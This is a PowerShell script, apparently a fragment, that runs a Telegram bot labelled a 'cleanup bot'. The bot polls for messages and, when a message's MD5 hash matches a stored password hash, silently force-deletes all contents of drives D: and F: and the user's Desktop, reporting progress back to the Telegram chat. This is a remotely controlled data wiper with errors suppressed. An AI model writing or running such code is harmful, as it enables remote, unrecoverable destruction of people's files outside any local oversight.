$Offset = 0

# ================= FUNCTIONS =================
function Send-Telegram {
    param ($Message)

    Invoke-RestMethod `
        -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
        -Method Post `
        -Body @{
            chat_id = $ChatID
            text    = $Message
        } | Out-Null
}

# ================= START =================
Send-Telegram "Cleanup bot is ONLINE"

while ($true) {

    $updates = Invoke-RestMethod `
        -Uri "https://api.telegram.org/bot$BotToken/getUpdates?offset=$Offset"

    foreach ($u in $updates.result) {

        $Offset = $u.update_id + 1
        $text = $u.message.text

        if ($text -eq "DELETE ALL") {
            Send-Telegram "Send password to confirm deletion"
        }
        elseif ($text) {

            # Convert received text to MD5
            $md5 = [System.Security.Cryptography.MD5]::Create()
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
            $hashBytes = $md5.ComputeHash($bytes)
            $hash = ([System.BitConverter]::ToString($hashBytes)).Replace("-", "").ToLower()

            if ($hash -eq $PasswordHash) {

                Send-Telegram "Deletion started"

                $Targets = @(
                    "D:\",
                    "F:\",
                    "$env:USERPROFILE\Desktop"
                )

                foreach ($t in $Targets) {

                    Send-Telegram "Deleting $t"

                    if (Test-Path $t) {
                        Get-ChildItem $t -Force -Recurse -ErrorAction SilentlyContinue |
                        Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
                    }
                }

                Send-Telegram "Deletion completed successfully"
            }
        }
    }

    Start-Sleep -Seconds 3
}
